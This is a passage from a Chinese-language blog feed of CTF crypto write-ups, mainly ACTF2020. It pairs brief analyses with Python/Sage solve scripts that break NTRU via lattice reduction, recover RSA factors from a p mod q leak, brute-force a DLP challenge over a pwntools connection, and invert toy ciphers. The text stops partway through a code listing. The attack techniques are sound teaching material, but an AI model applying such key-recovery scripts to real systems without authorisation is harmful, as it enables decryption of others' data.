$h=p<em>g</em>fq=p*g/f$.</p><p>Let $hp=p<em>p^{-1}</em>g/f$, so we have $g=f*hp$.</p><p>f’s coef $\in \{-1,0,1\}$, this means g is obtained as a combination of the polys $q,qx,qx^{2},…,qx^{n-1},hp,hp<em>x,hp</em>x^{2},…,hp*x^{n-1}$.</p><p>Assume $hp=\sum a_{i}x^{i}$,</p><script type="math/tex; mode=display">\left[\begin{matrix}q & 0 & ... & ... & 0 & ... & ... & 0\\0 & q & 0 & ... & 0 & ... & ... & 0\\... & ... & ... & ... & ... & ... & ... & ...\\0 & 0 & ... & q & 0 & ... & ... & 0\\a_{0} & a_{1} & ... & a_{n-1} & 1 & 0 & ... & 0\\a_{n-1} & a_{0} & ... & a_{n-2} & 0 & 1 & ... & 0\\... & ... & ... & ... & ... & ... & ... & ...\\a_{1} & a_{2} & ... & a_{0} & 0 & 0 & ... & 1\\\end{matrix}\right]</script><p>对上述格子作规约，SVP得到的向量如果呈现g的{0, 1, -1}特性且检验通过，则攻击成功</p><p>以$R(AL[0][n:])$作为f进行dec.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">109</span></span><br><span class="line">d = <span class="number">9</span></span><br><span class="line">q = <span class="number">2048</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">PR = PolynomialRing(ZZ, name = <span class="string">'x'</span>)</span><br><span class="line">x = PR.gen()</span><br><span class="line">R = PR.quotient_ring(x ^ n - <span class="number">1</span>, names = <span class="string">'y'</span>)</span><br><span class="line">y = R.gen()</span><br><span class="line"></span><br><span class="line">pubkey = </span><br><span class="line">pubkey = R(pubkey)</span><br><span class="line">c = </span><br><span class="line">c = R(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balance_mod</span><span class="params">(f, q)</span>:</span></span><br><span class="line">    g = list(((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n))</span><br><span class="line">    <span class="keyword">return</span> R(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_mod_prime</span><span class="params">(f, p)</span>:</span></span><br><span class="line">    T = R.base().change_ring(Integers(p)).quotient(x ^ n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(<span class="number">1</span> / T(f))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(c, prikey)</span>:</span></span><br><span class="line">    f, fp = prikey</span><br><span class="line">    a = balance_mod(c * f, q)</span><br><span class="line">    <span class="keyword">return</span> balance_mod(a * fp, p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(pubkey, c)</span>:</span></span><br><span class="line">    A = Matrix(ZZ, <span class="number">2</span> * n, <span class="number">2</span> * n)</span><br><span class="line">    hp = inverse(p, q) * pubkey</span><br><span class="line">    hp_list = list(hp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        A[i, i] = q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n, <span class="number">2</span> * n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            A[i, j] = hp_list[(j - i) % n]</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">    AL = A.BKZ()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> AL:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = R(row[n:].list())</span><br><span class="line">            fp = invert_mod_prime(f, p)</span><br><span class="line">            <span class="keyword">return</span> dec(c, (f, fp))</span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># may failed with shortest vector(return more if failed)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">m = crack(pubkey, c)</span><br><span class="line">flag = <span class="string">''</span>.join(str(_) <span class="keyword">for</span> _ <span class="keyword">in</span> list(m))</span><br><span class="line">pad = <span class="number">8</span> - len(flag) % <span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(pad + <span class="number">1</span>):</span><br><span class="line">    print(long_to_bytes(int(<span class="string">'0'</span> * i + flag + <span class="string">'0'</span> * (pad - i), <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'\x80Fdl\xccfj\xc4pr\xc8fF\x80'</span></span><br><span class="line"><span class="string">b'@#26f35b89d3#@'</span></span><br><span class="line"><span class="string">b' \x11\x99\x1b3\x19\x9a\xb1\x1c\x1c\xb2\x19\x91\xa0'</span></span><br><span class="line"><span class="string">b'\x10\x08\xcc\x8d\x99\x8c\xcdX\x8e\x0eY\x0c\xc8\xd0'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(ACTF2020)</title>
      <link href="/2020/06/06/WriteUp-ACTF2020/"/>
      <url>/2020/06/06/WriteUp-ACTF2020/</url>
      
        <content type="html"><![CDATA[<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>期末月了quq，打完RCTF(多元coppersmith鲨我😭)后，回来打了一波校赛（web听同学说应该有丶顶，但退坑web手已经看不下去了- -，cry这次应该考虑到了有学弟学妹，所以偏引导向）</p><p>这次ACTF打完<strong>真</strong>回去补课内ddl了（逃</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Column-Permutation-Cipher"><a href="#Column-Permutation-Cipher" class="headerlink" title="Column Permutation Cipher"></a>Column Permutation Cipher</h3><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>简单列置换密码，爆破key</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ct = </span><br><span class="line">ct_len = len(ct)</span><br><span class="line">pt = [<span class="string">'?'</span>] * ct_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, ct_len // <span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> (ct_len % i) != <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">print(i)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(ct_len // i):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(j, ct_len, ct_len // i):</span><br><span class="line">pt[cnt] = ct[k]</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span>.join(pt)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"actf"</span> <span class="keyword">in</span> flag:</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="我的密码本"><a href="#我的密码本" class="headerlink" title="我的密码本"></a>我的密码本</h3><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>替换密码，pt马丁路德金i have a dream，写字典跑脚本还不如直接sublime- -</p><h3 id="bomb-or-boom"><a href="#bomb-or-boom" class="headerlink" title="bomb or boom"></a>bomb or boom</h3><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>披cry皮misc题，bloom (k, n)门限方案(k = 4, n = 5)</p><ul><li>Secret 1: 培根</li><li>Secret 2: 盲文 <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></li><li>Secret 4: AAencode</li><li>Secret 5: Brainfuck</li></ul><p>bloom门限恢复明文即可.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="number">2891369521230520600</span></span><br><span class="line">m1 = <span class="number">5539166121540472709</span></span><br><span class="line">a2 = <span class="number">5485400237604727152</span></span><br><span class="line">m2 = <span class="number">9993590208169240051</span></span><br><span class="line">a3 = <span class="number">15126620242797492888</span></span><br><span class="line">m3 = <span class="number">38726457607077802967</span></span><br><span class="line">a4 = <span class="number">63558232650391605454</span></span><br><span class="line">m4 = <span class="number">134070550878039878083</span></span><br><span class="line">a = [a1, a2, a3, a4]</span><br><span class="line">m = [m1, m2, m3, m4]</span><br><span class="line">print(bytes.fromhex(hex(crt(a, m))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h3 id="naive-encryption"><a href="#naive-encryption" class="headerlink" title="naive encryption"></a>naive encryption</h3><p>Enc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">k = [...]</span><br><span class="line">len_k = len(k)</span><br><span class="line">len_flag = len(flag)</span><br><span class="line">...</span><br><span class="line">cipher = flag</span><br><span class="line">n = <span class="number">1000</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len_flag):</span><br><span class="line">        cipher[i] = (cipher[i] * k[(n + <span class="number">2</span>) % len_k] + k[(n * <span class="number">7</span>) % len_k]) &amp; <span class="number">0xff</span></span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">print(cipher)</span><br></pre></td></tr></table></figure><p>Dec</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cipher [i] = ((cipher[i] - k[(n * <span class="number">7</span>) % len_k]) * inverse(k[(n + <span class="number">2</span>) % len_k], <span class="number">0x100</span>)) % <span class="number">0x100</span></span><br></pre></td></tr></table></figure><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cipher = [...]</span><br><span class="line">k = [...]</span><br><span class="line">len_k = len(k)</span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> n &lt;= <span class="number">1000</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">        cipher [i] = ((cipher[i] - k[(n * <span class="number">7</span>) % len_k]) * inverse(k[(n + <span class="number">2</span>) % len_k], <span class="number">0x100</span>)) % <span class="number">0x100</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line">print(bytes(cipher))</span><br></pre></td></tr></table></figure><h3 id="naive-rsa"><a href="#naive-rsa" class="headerlink" title="naive rsa"></a>naive rsa</h3><h4 id="题解分析-3"><a href="#题解分析-3" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>已知$a=p\%q$，即$p=iq+a$，爆破i使得方程在ZZ下有解即可.</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">1</span>, <span class="number">2</span>**<span class="number">21</span>)):</span><br><span class="line">    r, _ = iroot(a**<span class="number">2</span> + <span class="number">4</span> * i * n, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> _:</span><br><span class="line">        q = (-a + int(r)) // (<span class="number">2</span> * i)</span><br><span class="line">        <span class="keyword">assert</span>(n % q == <span class="number">0</span>)</span><br><span class="line">        p = n // q</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(<span class="number">65537</span>, phi)</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="DLP头号玩家"><a href="#DLP头号玩家" class="headerlink" title="DLP头号玩家"></a>DLP头号玩家</h3><h4 id="题解分析-4"><a href="#题解分析-4" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><ul><li>level1: <code>p=getPrime(33)</code>，BSGS复杂度控制在$O(2^{16})$.</li><li>level2: 给出$g,g^{k}\ mod\ p,m*g^{dk}\ mod\ p$，且<code>d=bytes_to_long(message[0:2])</code>，所以在0xffff下爆破d即可还原m.</li><li>level3: 发现并不是ECDLP- -因为最后给出的cipher不是曲线上的点，而是实数范围上的<code>message[k]*k_Q_x</code>，发现源码中的<code>get_ng</code>函数实际上就是将椭圆上的点*100，于是题目给出基点G，求出$C=100^{2}G$，$chr(cipher//C_{x})$即为对应明文字节，逐位恢复即可. </li></ul><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">flag_dist = (string.ascii_letters + string.digits + <span class="string">"-&#123;&#125;"</span>).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"[:20]="</span>)</span><br><span class="line">    prefix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pre = sha512(long_to_bytes(n)).hexdigest()[:<span class="number">20</span>]</span><br><span class="line">        <span class="keyword">if</span> pre == prefix:</span><br><span class="line">            io.sendline(str(n))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = ceil(sqrt(p - <span class="number">1</span>))</span><br><span class="line">    S = &#123;pow(alpha, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = pow(alpha, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">not</span> <span class="keyword">in</span> flag_dist:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level1</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"p="</span>)</span><br><span class="line">    p = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    message1 = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        io.recvuntil(<span class="string">"c="</span>)</span><br><span class="line">        c = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">        y = bsgs(g, c, p)</span><br><span class="line">        <span class="keyword">if</span> len(y):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> y:</span><br><span class="line">                <span class="keyword">if</span> check(long_to_bytes(_)):</span><br><span class="line">                    message1 += long_to_bytes(_)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Failed."</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    message1 = message1.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(message1)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the message:"</span>, message1)</span><br><span class="line">    <span class="keyword">return</span> message1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level2</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"pubkey= ("</span>)</span><br><span class="line">    pubkey = io.recvline().strip().decode(<span class="string">"utf-8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    pubkey = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> pubkey.split(<span class="string">","</span>)]</span><br><span class="line">    e, g, p = pubkey[<span class="number">0</span>], pubkey[<span class="number">1</span>], pubkey[<span class="number">2</span>]</span><br><span class="line">    io.recvuntil(<span class="string">"cipher= ("</span>)</span><br><span class="line">    cipher = io.recvline().strip().decode(<span class="string">"utf-8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    cipher = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> cipher.split(<span class="string">","</span>)]</span><br><span class="line">    a, b = cipher[<span class="number">0</span>], cipher[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">        message2 = long_to_bytes((inverse(pow(a, d, p), p) * b) % p)</span><br><span class="line">        <span class="keyword">if</span> check(message2):</span><br><span class="line">            message2 = (long_to_bytes(d) + message2).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            print(message2)</span><br><span class="line">            io.sendlineafter(<span class="string">"input the message:"</span>, message2)</span><br><span class="line">            <span class="keyword">return</span> message2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level3</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"p="</span>)</span><br><span class="line">    p = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    params = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    regex = re.compile(<span class="string">"a=(\d+), b=(\d+)"</span>)</span><br><span class="line">    params = regex.findall(params)[<span class="number">0</span>]</span><br><span class="line">    a, b = int(params[<span class="number">0</span>]), int(params[<span class="number">1</span>])</span><br><span class="line">    Ep = EllipticCurve(GF(p), [a, b])</span><br><span class="line">    message3 = []</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        s = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        regex = re.compile(<span class="string">"G=\((\d+),(\d+)\),C=(\d+)"</span>)</span><br><span class="line">        s = regex.findall(s)[<span class="number">0</span>]</span><br><span class="line">        x, y, c = int(s[<span class="number">0</span>]), int(s[<span class="number">1</span>]), int(s[<span class="number">2</span>])</span><br><span class="line">        G = Ep(x, y)</span><br><span class="line">        C = <span class="number">10000</span> * G</span><br><span class="line">        message3.append(c // int(C[<span class="number">0</span>]))</span><br><span class="line">    message3 = <span class="string">""</span>.join(chr(_) <span class="keyword">for</span> _ <span class="keyword">in</span> message3)</span><br><span class="line">    print(message3)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the message:"</span>, message3)</span><br><span class="line">    <span class="keyword">return</span> message3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    print(level1() + level2() + level3())</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Imitation-game"><a href="#Imitation-game" class="headerlink" title="Imitation game"></a>Imitation game</h3><h4 id="题解分析-5"><a href="#题解分析-5" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iv=getRandomRange(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(iv,message)</span>:</span></span><br><span class="line">    padding=[iv]   </span><br><span class="line">    cipher=[message[<span class="number">0</span>]^padding[<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len_flag):</span><br><span class="line">        <span class="comment">#print(cipher)</span></span><br><span class="line">        padding.append(cipher[i<span class="number">-1</span>]^padding[i<span class="number">-1</span>])</span><br><span class="line">        cipher.append(message[i]^padding[i])</span><br><span class="line">    print(<span class="string">"cipher=&#123;&#125;"</span>.format(cipher))</span><br></pre></td></tr></table></figure><p>即$cipher=[m[0]\oplus iv,m[1]\oplus m[0],…,m[n-1]\oplus m[n-2]]$.</p><p>所以爆破iv获得254种可能中间态.</p><p>而中间态和flag间关系如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    message=strxor(flag,plaintext[i])</span><br><span class="line">    encrypt(iv,message)</span><br></pre></td></tr></table></figure><p>MTP老套路了- -</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="[exp]"></a>[exp]</h4><p>jupyter里手操，而且本题中MTP不论是用猜测空格还是字频分析都存在一定误差，需手动调整- -老毛病了（估计也有可能是我一直用的频率表不太对</p><h3 id="naive-aes"><a href="#naive-aes" class="headerlink" title="naive aes"></a>naive aes</h3><h4 id="题解分析-6"><a href="#题解分析-6" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>考察简单的S盒及P盒逆向算法</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 